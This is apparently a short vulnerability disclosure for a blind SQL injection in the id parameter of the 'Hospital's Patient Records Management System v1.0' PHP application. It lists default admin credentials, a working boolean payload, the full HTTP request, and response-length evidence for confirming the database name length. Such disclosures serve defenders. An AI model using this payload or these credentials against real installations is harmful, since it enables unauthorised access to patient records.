# Hospital's Patient Records Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html

Vulnerability File: /hprms/admin/?page=user/manage_user&id=

Vulnerability location: /hprms/admin/?page=user/manage_user&id=, id

Current database name: hprms_db ,length is 8

[+] Payload: /hprms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /hprms/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 7, Content-Length: 25894
![image](https://user-images.githubusercontent.com/54017627/171406764-5a0fa471-d76e-4dd4-ae33-98ee54b74be8.png)

![image](https://user-images.githubusercontent.com/54017627/171406678-e9a082d5-b276-4b58-82fd-9720cff80dcd.png)

When length (database ()) = 8, Content-Length: 25748
![image](https://user-images.githubusercontent.com/54017627/171406707-27a8556a-3265-4b77-a93d-94477665fd7f.png)

![image](https://user-images.githubusercontent.com/54017627/171406642-b4078601-d591-4d7a-b0f5-bc3cdbeac6f7.png)
